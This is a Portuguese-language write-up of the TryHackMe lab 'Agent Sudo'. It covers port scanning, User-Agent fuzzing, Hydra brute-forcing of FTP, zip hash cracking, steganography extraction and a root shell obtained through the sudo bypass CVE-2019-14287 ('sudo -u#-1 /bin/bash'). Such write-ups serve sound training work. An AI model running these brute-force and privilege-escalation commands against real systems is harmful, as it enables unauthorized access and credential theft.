---
title: "Agent Sudo"
date: 2026-06-13
summary: "Enumeração web, brute-force em FTP, esteganografia e escalada de privilégios explorando o sudo."
platform: "TryHackMe"
difficulty: "Fácil"
os: "Linux"
tags: ["Enumeração", "FTP", "Esteganografia", "Sudo"]
draft: false
---

## Visão Geral

Para resolver a máquina Agent Sudo, precisei manipular cabeçalhos HTTP (`User-Agent`) para achar a porta de entrada. Depois, fiz brute-force no FTP e usei esteganografia para extrair arquivos ocultos em imagens. No final, escalei privilégios explorando o CVE-2019-14287 no `sudo`.

## Reconhecimento

Primeiro, adicionei o IP da máquina e o domínio `agent.thm` no arquivo `/etc/hosts`.

*Configuração do /etc/hosts*
```bash
sudo nano /etc/hosts
# Adicionar: <IP-DA-MAQUINA> agent.thm
```

Depois, rodei um **Nmap** e encontrei as portas 21 (FTP), 22 (SSH) e 80 (HTTP) abertas.

*Comando de varredura Nmap*
```bash
nmap -sC -sV -T4 agent.thm
```

![Resultado do escaneamento do Nmap indicando portas 21, 22 e 80.](/images/writeups/agent-sudo/nmap.png)

Tentei rodar o **Feroxbuster** na porta 80 para mapear diretórios ocultos, mas o brute-force de URLs não achou nada de interessante.

*Tentativa de fuzzing de diretórios com Feroxbuster*
```bash
feroxbuster -u http://agent.thm -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,js -s 200,301,302,403
```

## Exploração Inicial

A página web na porta 80 pedia um "codinome" de agente. Já que o Feroxbuster falhou, pensei em testar o cabeçalho `User-Agent`.

Usei o **Burp Suite** para testar letras do alfabeto no `User-Agent` até o servidor aceitar a letra certa.

*Manipulação e Fuzzing do User-Agent (exemplo conceitual)*
```bash
# Alterando o User-Agent na requisição HTTP
User-Agent: C
```

A aplicação me redirecionou para uma página que falava sobre o agente "Chris". Com esse nome de usuário em mãos, fui para a porta 21 tentar quebrar a senha do FTP com o **Hydra**.

*Ataque de força bruta no FTP via Hydra*
```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://agent.thm
```

![Hydra obtendo sucesso na descoberta da senha do FTP para o usuário chris.](/images/writeups/agent-sudo/bruteforce-ftp.png)

## Obtenção de Shell e Movimentação Lateral

Dentro do FTP, achei algumas imagens (como a `cute-alien.jpg`) e um arquivo compactado.

![Arquivos disponíveis no servidor FTP.](/images/writeups/agent-sudo/arquivos-ftp.png)

O `.zip` pedia senha. Extraí o hash com o `zip2john` e consegui quebrar usando o **John The Ripper**.

*Quebra da senha do arquivo zip com John*
```bash
zip2john arquivo.zip > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![Descoberta da senha utilizada para os próximos passos.](/images/writeups/agent-sudo/senha-imagem.png)

Usei essa senha descoberta como *passphrase* no **stegseek** e consegui extrair os dados escondidos na imagem `cute-alien.jpg`.

*Extração de arquivo oculto com stegseek*
```bash
stegseek cute-alien.jpg
```

![Uso do stegseek para quebra e extração de esteganografia.](/images/writeups/agent-sudo/stegseek-cute-alien.png)

A extração me deu um arquivo de texto com a senha do usuário `james` no SSH.

![Mensagem secreta extraída revelando a senha do SSH.](/images/writeups/agent-sudo/mensagem-imagens.png)

Loguei com essas credenciais no SSH e peguei a *flag* de usuário (`user.txt`).

![Acesso via SSH e leitura da flag do usuário james.](/images/writeups/agent-sudo/user-flag.png)

## Escalada de Privilégios

No shell do `james`, rodei `sudo -l` para ver o que eu podia executar como administrador.

*Verificando as permissões disponíveis no Sudo*
```bash
sudo -l
```

A saída retornou `(ALL, !root) /bin/bash`, o que significa que o usuário podia rodar o `/bin/bash` como qualquer outro usuário do sistema, menos como root.

Verifiquei a versão do Sudo instalada e vi que era vulnerável ao **CVE-2019-14287**. Essa falha permite ignorar a restrição `!root` passando o *User ID* como `-1`. O sistema se perde na conversão e executa o comando como ID 0 (`root`).

*Exploração da falha CVE-2019-14287 para obter shell root*
```bash
sudo -u#-1 /bin/bash
```

Rodei o comando com esse bypass e ganhei um shell de root na mesma hora. Fui até o `/root` e li a flag final (`root.txt`).

![Comando da exploração CVE executado com sucesso e extração da flag de Root.](/images/writeups/agent-sudo/root-flag.png)

## Conclusão

A Agent Sudo é bem legal para treinar vetores de entrada diferentes, como explorar e fazer fuzzing direto no cabeçalho `User-Agent`. O desafio juntou isso com esteganografia básica e uma falha pública antiga do Linux.

Explorar o CVE-2019-14287 direto no `sudo` mostrou na prática por que manter os pacotes atualizados é tão importante. Uma regra que deveria proteger o root acabou virando a porta de entrada para comprometer a máquina toda só por causa de um bug.

## Referências

- StationX. *Nmap Cheat Sheet*. Disponível em: <https://www.stationx.net/nmap-cheat-sheet/>
- National Vulnerability Database. *CVE-2019-14287 Detail*. Disponível em: <https://nvd.nist.gov/vuln/detail/CVE-2019-14287>
- HackTricks. *Steganography Tricks*. Disponível em: <https://book.hacktricks.xyz/crypto-and-stego/stego-tricks>
